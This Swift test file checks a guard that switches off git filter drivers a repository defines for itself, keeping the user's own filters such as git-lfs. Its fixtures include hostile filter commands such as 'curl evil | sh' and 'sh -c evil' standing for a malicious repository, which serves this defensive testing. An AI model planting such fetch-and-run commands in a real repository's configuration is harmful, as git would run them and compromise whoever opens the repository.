import Foundation
import Testing

@testable import VibeGit

@Suite("The filters a repository defines for itself")
struct RepositoryFilterGuardTests {
  private func output(_ records: [(String, String, String, String?)]) -> Data {
    var data = Data()
    for (scope, origin, key, value) in records {
      data.append(Data("\(scope)\0\(origin)\0\(key)".utf8))
      if let value { data.append(Data("\n\(value)".utf8)) }
      data.append(0)
    }
    return data
  }

  @Test("Git's records are read with their scope, origin, key and value")
  func parse() {
    let configuration = FilterConfiguration.parse(
      output([
        ("local", "file:.git/config", "filter.evil.clean", "sh -c 'x'"),
        ("local", "file:.git/config", "filter.evil.required", nil),
      ]))

    #expect(
      configuration.entries == [
        .init(
          scope: "local", origin: "file:.git/config", key: "filter.evil.clean", value: "sh -c 'x'"),
        .init(
          scope: "local", origin: "file:.git/config", key: "filter.evil.required", value: nil),
      ])
  }

  @Test("The user's own filters stay, and the repository's go unless they repeat the user's")
  func whichDrivers() {
    let configuration = FilterConfiguration.parse(
      output([
        ("global", "file:/Users/me/.gitconfig", "filter.lfs.clean", "git-lfs clean -- %f"),
        ("global", "file:/Users/me/.gitconfig", "filter.lfs.process", "git-lfs filter-process"),
        ("local", "file:.git/config", "filter.lfs.clean", "git-lfs clean -- %f"),
        ("local", "file:.git/config", "filter.lfs.process", "git-lfs filter-process"),
        ("local", "file:.git/config", "filter.evil.clean", "curl evil | sh"),
        ("worktree", "file:.git/config.worktree", "filter.other.smudge", "x"),
        ("local", "file:/tmp/inc.cfg", "filter.Ev.il.process", "y"),
        ("local", "file:.git/config", "filter.we=ird.clean", "z"),
        ("local", "file:.git/config", "filter.inert.required", "true"),
        ("global", "file:/Users/me/.gitconfig", "filter.media.clean", "git media clean %f"),
      ]))

    #expect(configuration.driversToNeutralize == ["Ev.il", "evil", "other", "we=ird"])
  }

  @Test("A local filter that changes the user's command is switched off")
  func changedCommand() {
    let configuration = FilterConfiguration.parse(
      output([
        ("global", "file:/Users/me/.gitconfig", "filter.lfs.clean", "git-lfs clean -- %f"),
        ("local", "file:.git/config", "filter.lfs.clean", "sh -c evil"),
      ]))

    #expect(configuration.driversToNeutralize == ["lfs"])
  }

  @Test("Each driver is given an empty command and is no longer required")
  func environment() {
    let environment = FilterConfiguration.environment(neutralizing: ["we=ird"])

    #expect(environment["GIT_CONFIG_COUNT"] == "4")
    #expect(environment["GIT_CONFIG_KEY_0"] == "filter.we=ird.clean")
    #expect(environment["GIT_CONFIG_VALUE_0"] == "")
    #expect(environment["GIT_CONFIG_KEY_3"] == "filter.we=ird.required")
    #expect(environment["GIT_CONFIG_VALUE_3"] == "false")
    #expect(FilterConfiguration.environment(neutralizing: []).isEmpty)
  }

  @Test("Only status reads the working tree, and only it is guarded")
  func statusIndex() {
    #expect(ProcessGitCommandRunner.statusIndex(in: ["status", "-z"]) == 0)
    #expect(ProcessGitCommandRunner.statusIndex(in: ["--no-optional-locks", "status"]) == 1)
    #expect(ProcessGitCommandRunner.statusIndex(in: ["rev-parse", "status"]) == nil)
    #expect(ProcessGitCommandRunner.statusIndex(in: ["--no-optional-locks", "diff"]) == nil)
  }

  @Test("The files an answer depends on include what the configuration includes, relative to it")
  func files() {
    let configuration = FilterConfiguration.parse(
      output([
        ("local", "file:.git/config", "core.repositoryformatversion", "0"),
        ("local", "file:.git/config", "include.path", "../shared.cfg"),
        ("global", "file:/Users/me/.gitconfig", "include.path", "/Users/me/other.cfg"),
      ]))

    #expect(configuration.files(in: "/repo") == ["/repo/.git/config", "/repo/shared.cfg"])
    #expect(!configuration.dependsOnMoreThanItsFiles)
  }

  @Test("A conditional include on the branch, or a per-worktree configuration, is never remembered")
  func notRemembered() {
    for (key, value) in [
      ("includeif.onbranch:main.path", "x.cfg"), ("extensions.worktreeconfig", "true"),
    ] {
      let configuration = FilterConfiguration.parse(
        output([("local", "file:.git/config", key, value)]))
      #expect(configuration.dependsOnMoreThanItsFiles)
    }
  }

  @Test("A repository's configuration is listed once, and again when a file of it changes")
  func remembered() async throws {
    let sandbox = try Sandbox()
    defer { sandbox.remove() }
    let repository = sandbox.path("repository")
    try await makeRepository(at: repository)
    let filters = RepositoryFilterGuard()
    let runner = ProcessGitCommandRunner(filters: filters)

    _ = try await runner.run(["status", "--porcelain=v2"], in: repository)
    _ = try await runner.run(["status", "--porcelain=v2"], in: repository)
    _ = try await runner.run(["rev-parse", "--show-toplevel"], in: repository)
    #expect(await filters.enumerations == 1)

    try await git(["config", "vibe.test", "changed"], in: repository)
    _ = try await runner.run(["status", "--porcelain=v2"], in: repository)
    #expect(await filters.enumerations == 2)
  }
}
